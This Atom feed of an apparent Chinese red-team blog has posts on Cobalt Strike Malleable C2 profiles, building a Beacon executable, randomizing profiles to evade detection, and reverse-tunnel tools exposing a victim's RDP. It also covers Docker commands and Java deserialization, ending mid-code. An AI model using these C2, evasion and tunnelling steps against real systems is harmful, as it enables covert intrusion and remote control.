<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>白仁的博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://bai-ren-1.github.io/"/>
  <updated>2020-04-16T12:23:27.600Z</updated>
  <id>http://bai-ren-1.github.io/</id>
  
  <author>
    <name>白仁</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Malleable_C2_Profile</title>
    <link href="http://bai-ren-1.github.io/2020/04/16/Malleable_C2_Profile/"/>
    <id>http://bai-ren-1.github.io/2020/04/16/Malleable_C2_Profile/</id>
    <published>2020-04-16T08:55:13.000Z</published>
    <updated>2020-04-16T12:23:27.600Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Malleable-C2-Profile"><a href="#Malleable-C2-Profile" class="headerlink" title="Malleable_C2_Profile"></a>Malleable_C2_Profile</h1><p>Malleable_C2_Profile是CobaltStrike中一种配置文件。目的是用来伪装流量，让通讯更加隐蔽。下面贴上  <a href="https://wbglil.gitbooks.io/cobalt-strike/content/cobalt-strikekuo-zhan/malleable-c2.html" target="_blank" rel="noopener">https://wbglil.gitbooks.io/cobalt-strike/content/cobalt-strikekuo-zhan/malleable-c2.html</a>  上的解释。</p><blockquote><p>Cobalt Strike的 Malleable-C2-Profiles配置文件是用来伪装流量，让通讯更加隐蔽和控制其行为的一种方式。</p><p>Beacon中使用http通信的payload由Malleable-C2-profile文件控制，关于Malleable-C2-profile，它是一个简单的配置文件，用来指定如何转换数据并将其存储在transaction中，转换和存储数据的相同配置文件也从transaction中提取和恢复。</p></blockquote><h2 id="0x00-加载方式"><a href="#0x00-加载方式" class="headerlink" title="0x00 加载方式"></a>0x00 加载方式</h2><p>首先贴上别人制作好的混淆profile，<a href="https://github.com/rsmudge/Malleable-C2-Profiles。加载profile的方式也很简单，在开启CobaltStrike（下面简称：CS）的命令时，在ip和密码后加上你的profile的路径就能让服务器通信时使用profile进行流量混淆达成隐藏的目的。如下所示：" target="_blank" rel="noopener">https://github.com/rsmudge/Malleable-C2-Profiles。加载profile的方式也很简单，在开启CobaltStrike（下面简称：CS）的命令时，在ip和密码后加上你的profile的路径就能让服务器通信时使用profile进行流量混淆达成隐藏的目的。如下所示：</a></p><ul><li>启动CS的teamserver时同时加载Malleable-C2-Profiles命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver [external IP] [password] [/path/to/my.profile]</span><br></pre></td></tr></table></figure><ul><li>检查预览Profiles文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./c2lint [/path/to/my.profile]</span><br></pre></td></tr></table></figure><h2 id="0x01-使用实例"><a href="#0x01-使用实例" class="headerlink" title="0x01 使用实例"></a>0x01 使用实例</h2><p>因为是在公司的资产上进行攻击的，这里就不放上截图了。稍微记录一下手法就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CS服务器：10.100.19.19</span><br><span class="line">CS客户端：10.100.19.19</span><br><span class="line">受害机：20.100.0.25</span><br></pre></td></tr></table></figure><p>首先启动CS服务器，这里假设使用的混淆profile名为amazon.profile</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CS服务器：</span><br><span class="line">./teamserver 10.100.19.19 123456 /opt/malleable_C2_profile/amazon.profile</span><br></pre></td></tr></table></figure><p>然后我们在同一部主机另开终端连接CS服务，成为CS客户端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CS客户端</span><br><span class="line">./start.sh</span><br></pre></td></tr></table></figure><p>然后CS就会执行进入图形化界面。直接使用默认的端口和用户名密码点击connect进入CS页面。我们要给受害机开启一个监听端口，点击“CobaltStrike -&gt; listeners”，然后选择参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Name：didi</span><br><span class="line">Paylaod：Beacon Http</span><br><span class="line">HTTP Hosts：10.10.19.19</span><br><span class="line">HTTP Hosts（Stager）：10.10.19.19</span><br><span class="line">Profile:defualt</span><br><span class="line">HTTP Port(C2):80</span><br></pre></td></tr></table></figure><p>这样就就在CS服务器上开启了80端口监听受害机流量啦，并且通过http形式进行传输。我们现在要生成控制客户端的恶意软件，这里有很多种形式。下面是参考链接：<a href="https://blog.csdn.net/weixin_44677409/article/details/102725129" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44677409/article/details/102725129</a> </p><p>这里我继续我自己的做法，我想生成一个受害机上运行的恶意文件。点击“Attack -&gt; Packeges -&gt; Windows Executables”，然后选择刚刚添加的监听并点击Generate进行构建。然后我们将输出的exe上传到受害主机上，只要受害机一点击，马上就能在CS上上线。</p><p>然后因为我们选择了profile，所以抓包观察的话能看到，通信请求都被伪造成对amazon的请求，能在一定程度上达成混淆视听的作用。</p><h2 id="0x02-随机profile"><a href="#0x02-随机profile" class="headerlink" title="0x02 随机profile"></a>0x02 随机profile</h2><p>因为这个profile库已经发布很久了，我个人感觉肯定很多对其进行样本添加了，那我们应该对其进行随机化进行绕检测。</p><p>工具链接：<a href="https://github.com/bluscreenofjeff/Malleable-C2-Randomizer。因为今天在公司上大了一份详细使用，这里就不详细写了，就稍微记录一下简单的命令即可：" target="_blank" rel="noopener">https://github.com/bluscreenofjeff/Malleable-C2-Randomizer。因为今天在公司上大了一份详细使用，这里就不详细写了，就稍微记录一下简单的命令即可：</a></p><ul><li>模板的具体样本的生成<ul><li>我们可以使用它给我们的模板（/sample template），然后执行“python malleable-c2-randomizer.py -profile /opt/Malleable-C2-Randomizer/amazon.profile -count 2 -cobalt /opt/cobaltstrike4.0 -output shabi”直接生成它预设的模板的2个样本。</li><li>我们也可以自己在想改的地方改成“%%wordlist%%”，然后执行“python malleable-c2-randomizer.py -profile /opt/Malleable-C2-Randomizer/amazon.profile -count 1 -cobalt /opt/cobaltstrike4.0 -wordlist /opt/hostname.txt -output shabi”（/opt/hostname.txt里面就是自己写好的想要替换进去模板种的%%wordlist%%的具体内容）生成我们需要的模板的1个样本。</li></ul></li><li>然后根据上一章节一样的启动方法，把指定profile路径的那个位置修改为刚刚Randomize生成新的profile的路径，然后启动即可。</li></ul><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>CS是今天第一次接触，就这个隐藏通信流量就已经感觉到了他的强大之处，继续努力变得更强。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Malleable-C2-Profile&quot;&gt;&lt;a href=&quot;#Malleable-C2-Profile&quot; class=&quot;headerlink&quot; title=&quot;Malleable_C2_Profile&quot;&gt;&lt;/a&gt;Malleable_C2_Profile&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>蓝军代理工具</title>
    <link href="http://bai-ren-1.github.io/2020/04/16/%E8%93%9D%E5%86%9B%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7/"/>
    <id>http://bai-ren-1.github.io/2020/04/16/%E8%93%9D%E5%86%9B%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7/</id>
    <published>2020-04-16T08:45:00.000Z</published>
    <updated>2020-04-16T08:56:10.714Z</updated>
    
    <content type="html"><![CDATA[<h1 id="蓝军代理工具"><a href="#蓝军代理工具" class="headerlink" title="蓝军代理工具"></a>蓝军代理工具</h1><p>好久没写博客了，最近一直复现各类代理和隧道的使用并且抓取通信流量进行分析。写这个文章，简单总结用法，并简单记录工作的进展。</p><h2 id="0x00-frp"><a href="#0x00-frp" class="headerlink" title="0x00 frp"></a>0x00 frp</h2><p>frp需要三台主机，一台内网受害机，一台外网服务机，一台外网攻击访问机。</p><ul><li>服务端配置frps.ini监听端口，然后./frps -c ./frps.ini开启监听。</li><li>客户端配置frpc.ini服务端地址和端口和使用的协议，然后./frpc -c ./frpc.ini开启。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp（远程连接时直接报错）</li><li><input checked disabled type="checkbox"> stcp（开启kali服务端./frps -c ./frps.ini。根据github的wiki上的配置，使用./frpc -c ./frpc.ini让受害机连接到kali。然后根据github的wiki上的配置，使用./frpc -c ./frpc让访问机连接到kali。然后访问机访问配置中自己本地的端口即可连接到受害机上）</li><li><input checked disabled type="checkbox"> xtcp（首先根据wiki在服务端的./frps.ini添加udp的监听端口。然后开启kali服务端./frps -c ./frps.ini。根据github的wiki上的配置，使用./frpc -c ./frpc.ini让受害机连接到kali。然后根据github的wiki上的配置，使用./frpc -c ./frpc让访问机连接到kali。然后访问机访问配置中自己本地的端口即可连接到受害机上）</li></ul><h2 id="0x01-fcn"><a href="#0x01-fcn" class="headerlink" title="0x01 fcn"></a>0x01 fcn</h2><p>fcn需要两台主机，一台内网受害机，一台外网攻击机（其客户端和服务端与其他相反）。</p><ul><li>在内网主机上开启fcn后点击服务端，配置好密码并开启服务。</li><li>在外网攻击机上开启fcn后点击客户端，配置好名称和ID密码等后等待连接成功。</li><li>连接成功后外网主机就能直接mstsc连接到内网主机上。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> <p>tcp</p></li><li><input checked disabled type="checkbox"> <p>udp</p></li><li><input disabled type="checkbox"> <p>tls（复现失败，客户端运行后不能上线）</p></li></ul><h2 id="0x02-ngrok"><a href="#0x02-ngrok" class="headerlink" title="0x02 ngrok"></a>0x02 ngrok</h2><p>ngrok需要两台主机，一台内网受害机，一台外网攻击机。</p><ul><li>在ngrok官网申请个人账号，然后记录自己的token，下载客户端。</li><li>将客户端上传到受害机上，然后在受害机的cmd上按格式使用命令ngrok tcp 3389就能把本地远程桌面映射到ngrok提供的域名的端口上。</li><li>在攻击机上mstsc到ngrok提供的域名端口即可远程连接。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp （复现失败，无法连接远程桌面）</li></ul><h2 id="0x03-sunny-ngrok"><a href="#0x03-sunny-ngrok" class="headerlink" title="0x03 sunny-ngrok"></a>0x03 sunny-ngrok</h2><p>sunny-ngrok需要两台主机，一台内网受害机，一台外网攻击机。</p><ul><li>在ngrok官网申请个人账号，并开通隧道获取隧道ID，下载客户端。</li><li>将客户端上传到受害机上，然后在受害机上使用客户端按官网wiki的格式执行命令。其中隧道ID用于启动隧道，就能把本地远程桌面映射到sunny-ngrok提供的域名端口上。</li><li>在攻击机上mstsc到sunny-ngrok提供的域名端口即可远程连接。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp （复现失败，无法连接远程桌面）</li></ul><h2 id="0x04-natapp"><a href="#0x04-natapp" class="headerlink" title="0x04 natapp"></a>0x04 natapp</h2><p>natapp需要两台主机，一台内网受害机，一台外网攻击机。</p><ul><li>在natapp官网申请个人账号，并获取authtoken，下载客户端。</li><li>将客户端上传到受害机上，然后在受害机上运行客户端，通过指定authtoken启动隧道，就能把本地远程桌面映射到natapp提供的域名端口上。</li><li>在攻击机上mstsc到natapp提供的域名端口即可远程连接。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp （复现失败，无法连接远程桌面）</li></ul><h2 id="0x05-小米球"><a href="#0x05-小米球" class="headerlink" title="0x05 小米球"></a>0x05 小米球</h2><p>小米球需要两台主机，一台内网受害机，一台外网攻击机。</p><ul><li>在小米球官网申请个人账号，下载客户端。</li><li>将客户端上传到受害机上，在yml配置文件里面写好映射的本地端口和隧道名，使用cmd按官网教程格式运行命令，小米球就能把本地远程桌面映射到natapp提供的域名端口上。</li><li>在攻击机上mstsc到natapp提供的域名端口即可远程连接</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp （复现失败，无法连接远程桌面）</li></ul><h2 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h2><p>工具用法何其多，这些并不是重要的。最重要的是，我们要知道里面的原理，然后通过工具去积累思路，尝试自己去写出这样的工具，才是真正的学习呀。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;蓝军代理工具&quot;&gt;&lt;a href=&quot;#蓝军代理工具&quot; class=&quot;headerlink&quot; title=&quot;蓝军代理工具&quot;&gt;&lt;/a&gt;蓝军代理工具&lt;/h1&gt;&lt;p&gt;好久没写博客了，最近一直复现各类代理和隧道的使用并且抓取通信流量进行分析。写这个文章，简单总结用法，并简单记
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Docker</title>
    <link href="http://bai-ren-1.github.io/2020/04/05/Docker/"/>
    <id>http://bai-ren-1.github.io/2020/04/05/Docker/</id>
    <published>2020-04-05T05:01:14.000Z</published>
    <updated>2020-04-05T05:43:31.679Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>哎，要上班了。在家呆了这么久，突然得自己一人去工作，很不舍。不过，始终得静下心来，毕竟颓了这么久。所以今天写一篇简单的博客，记录一下工作技术栈之一的Docker简单用法。</p><h2 id="0x00-容器使用"><a href="#0x00-容器使用" class="headerlink" title="0x00 容器使用"></a>0x00 容器使用</h2><p>这里我把命令都集合在一起，看起来比较方便。下面都是有关容器的一些用法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull &lt;镜像名称&gt;  # 获取镜像</span><br><span class="line">$ docker run &lt;镜像名称&gt;       # 启动容器</span><br><span class="line">$ docker ps -a    # 查看所有容器列表</span><br><span class="line">$ docker start &lt;容器 ID&gt;  # 启动已停止的容器</span><br><span class="line">$ docker stop &lt;容器 ID&gt; # 停止容器</span><br><span class="line">$ docker restart &lt;容器 ID&gt; # 重启容器（启动容器是第一次，用的是run且参数是镜像）</span><br><span class="line">$ docker attach &lt;容器 ID&gt; # 进入容器（-d 参数时，容器启动后会进入后台，用attach可进入容器）</span><br><span class="line">$ docker export &lt;容器 ID&gt; &gt; &lt;文件名&gt; # 导出容器</span><br><span class="line">$ docker rm -f &lt;容器 ID&gt;      # 删除容器</span><br></pre></td></tr></table></figure><h2 id="0x01-镜像使用"><a href="#0x01-镜像使用" class="headerlink" title="0x01 镜像使用"></a>0x01 镜像使用</h2><p>OK，看完了容器，我们就来学习用法开启容器的镜像的用法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker images  # 列出本地镜像列表</span><br><span class="line">$ docker pull &lt;镜像名称&gt;:&lt;版本号&gt;# 拉取镜像到本地</span><br><span class="line">$ docker search &lt;搜索关键字&gt;  # 查找仓库的镜像</span><br><span class="line">$ docker rmi &lt;镜像名称&gt;# 删除本地镜像</span><br><span class="line">$ docker build# 创建新的镜像</span><br></pre></td></tr></table></figure><h2 id="0x02-仓库管理"><a href="#0x02-仓库管理" class="headerlink" title="0x02 仓库管理"></a>0x02 仓库管理</h2><p>我们要拉取镜像到本地，都是到仓库上面找的，仓库是集中存放镜像的地方。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker login# 登录仓库</span><br><span class="line">$ docker logout# 注销仓库</span><br><span class="line">$ docker push &lt;用户名&gt;/&lt;镜像名称&gt;:&lt;版本号&gt;# 推送镜像</span><br></pre></td></tr></table></figure><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>当然还有制作Dockerfile的内容，但是太多辣，这里先不写着了。等工作用到的时候再记录进来，祝一切顺利吧！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Docker&quot;&gt;&lt;a href=&quot;#Docker&quot; class=&quot;headerlink&quot; title=&quot;Docker&quot;&gt;&lt;/a&gt;Docker&lt;/h1&gt;&lt;p&gt;哎，要上班了。在家呆了这么久，突然得自己一人去工作，很不舍。不过，始终得静下心来，毕竟颓了这么久。所以今天写
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>Java反序列化</title>
    <link href="http://bai-ren-1.github.io/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://bai-ren-1.github.io/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-04-01T06:12:03.000Z</published>
    <updated>2020-04-02T03:20:58.945Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><p>没啥好说的，比赛打太多的憨批只会PHP，实际工作都是Java，鬼特么现在还有人用PHP就奇了。所以这里记录一下Java反序列化的机制，下一节博客再说Java反序列化漏洞。</p><h2 id="0x00-概念"><a href="#0x00-概念" class="headerlink" title="0x00 概念"></a>0x00 概念</h2><p>序列化和反序列化的实现方法概念？</p><ul><li>Java 序列化是指把 Java 对象转换为字节序列的过程。ObjectOutputStream类的 <strong>writeObject()方法</strong>可以实现序列化。</li><li>Java 反序列化是指把字节序列恢复为 Java 对象的过程。ObjectInputStream 类的 <strong>readObject()方法</strong>用于反序列化。</li></ul><blockquote><p>那么序列化的目的是什么呢？序列化与反序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。 </p></blockquote><h2 id="0x01-实现方法"><a href="#0x01-实现方法" class="headerlink" title="0x01 实现方法"></a>0x01 实现方法</h2><p>Java中的一个类的对象要想序列化成功，必须满足两个条件：</p><ul><li>该类必须实现 <strong>java.io.Serializable 接口</strong>，因为 Serializable 接口是启用其序列化功能的接口。</li><li>该类的所有属性必须是可序列化的。</li></ul><blockquote><p>关于<strong>接口和抽象方法</strong>等的相关知识请自行查阅相关课程。</p></blockquote><p>我们做一个简单的实验，用来验证序列化和反序列化的过程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shabi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现Serializable接口的Student类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(String sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//实现serialize接口的三个抽象方法，这里只是简单打印消息进行验证</span></span><br><span class="line">    <span class="comment">//不实现，也是能直接调用ObjectInputStream.readObject进行反序列化</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span>&#123;</span><br><span class="line">          System.out.println(<span class="string">"Student readObject"</span>);</span><br><span class="line">         s.defaultReadObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//不实现，也是能直接调用ObjectOutputStream.writeObject进行序列化的    </span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream s)</span><span class="keyword">throws</span> java.io.IOException</span>&#123;</span><br><span class="line">          System.out.println(<span class="string">"Student writeObject"</span>);</span><br><span class="line">          s.defaultWriteObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">readResolve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          System.out.println(<span class="string">"Student readResolve"</span>);</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> FileNotFoundException, IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    Student student = <span class="keyword">new</span> Student();</span><br><span class="line">    student.setName(<span class="string">"chenxiaoyi"</span>);</span><br><span class="line">    student.setSex(<span class="string">"man"</span>);</span><br><span class="line"><span class="keyword">try</span> (ObjectOutputStream output = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(<span class="string">"Student.txt"</span>)))) &#123;</span><br><span class="line">output.writeObject(student);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">try</span> (ObjectInputStream input = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">"Student.txt"</span>)))) &#123;</span><br><span class="line">Student student1 = (Student) input.readObject();</span><br><span class="line">System.out.println(student1.getName() + <span class="string">":"</span> + student1.getSex());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如果目标类中没有定义私有的writeObject或readObject方法，那么序列化和反序列化的时候将调用默认的方法来根据目标类中的属性（不包含transient修饰的属性以及static变量）来进行序列化和反序列化。</p><p>如果目标类中定义了私有的writeObject或readObject方法，那么序列化和反序列化的时候将通过反射调用目标类指定的writeObject或readObject方法来实现，比如将static变量也加入到序列化中。</p><p>至于readResolve同样也是通过<strong>反射</strong>调用的。从内存中反序列化地”组装”一个新对象时，就会自动调用这个 readResolve方法来返回指定好的对象。从上面结果可以看到它是在readObject之后调用的，因此readResolve可以最终修改反序列化得到的对象。</p></blockquote><p>关于相关的序列化和反序列化的过程的学习，要具体看下面实验：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt>在开始实验之前，我们可以看到项目的根目录下没有序列化文件的存在。OK，我们可以开始实验了。</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt></p><p>我们开始进行debug，看看这个具体过程。下断点，然后慢慢运行到对象输出流的<strong>writeObject方法</strong>即序列化处：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt></p><p>当运行到此时，我们可以看到已经生成了一个student对象和一个对象输出流output，我们看根目录下生成的Student.txt对象流文件：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" alt></p><blockquote><p>ObjectOutputStream建立后第一次写入一个对象时，会在对象数据前写入一些标志的数据“ACED0005” </p></blockquote><p>我们继续step over，看看执行完writeObject后的结果：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" alt></p><p>winhex中打开的Student.txt相应的变化了，文件中写入了我们需要的序列化内容：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" alt></p><p>序列化的内容实验好了，我们继续往下看看反序列化的实验：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" alt></p><p>程序在执行完对象输入流的<strong>readObject方法</strong>后，可见反序列化的得到的新对象student1的属性和原对象student的属性时一样的。OK，自此序列化和反序列化的触发点和具体展示效果实验结束。</p><h2 id="0x02-特点"><a href="#0x02-特点" class="headerlink" title="0x02 特点"></a>0x02 特点</h2><p>Java的序列化常见一般是通过两种方式：</p><ul><li>实现 Serializable 接口。</li><li>实现 Externalizable 接口。</li></ul><p>实现Serialize接口的序列化注意点有：</p><ul><li>序列化时，不会序列化<strong>静态变量</strong>，因为只有堆内存会被序列化，所以静态变量会天生不会被序列化。</li><li>序列化时，不会序列化<strong>transient</strong>修饰的变量，也就是通过序列化后再被反序列化后读取这个变量不会有值。</li><li>反序列化时，不会调用对象的任何<strong>构造方法</strong>。</li></ul><p>为了验证上面的特性，我对原来的代码进行一些小修改：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" alt></p><p>我把两个属性分别加上静态声明和transient进行声明，重新进行序列化和反序列化操作，得到的结果如下：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png" alt></p><p>可以看到我们的用<strong>transient修饰</strong>的属性反序列化为空了，原因在于序列化的时候不会序列化其修饰的属性，所以自然为空。但是这里会有个奇怪的地方，为什么<strong>static修饰</strong>的静态变量也没写入文件，怎么反序列化会有值？</p><blockquote><p>这里被static修饰的变量反序列化后有值是因为：静态变量在方法区,本来流里面就没有写入静态变量,我们打印静态变量当然会去方法区查找。我们当前jvm中有，所以静态变量在序列化后仍然有值。 </p><p>由此可以看出 static 修饰的变量本身是不会被序列化的。我们读取的值是当前jvm中的方法区对应此变量的值，所以最后输出的值为我们对static变量后赋的值。</p></blockquote><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png" alt></p><p>我们通过生成的文件也可以看出来，两个被修饰变量都没有被保存进序列化文件中。</p><h2 id="0x03-简单实验"><a href="#0x03-简单实验" class="headerlink" title="0x03 简单实验"></a>0x03 简单实验</h2><p>前面我们能知道序列化过程依赖于 ObjectOutputStream 类中 <strong>writeObject</strong> 方法，而反序列化的过程是依赖于 ObjectOutputStream 类中 <strong>readObject</strong> 方法。 如果实际情况下，我们能够重写 <strong>readObject</strong> 方法，那么就有可能达到反序列化的时候命令执行的作用。 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 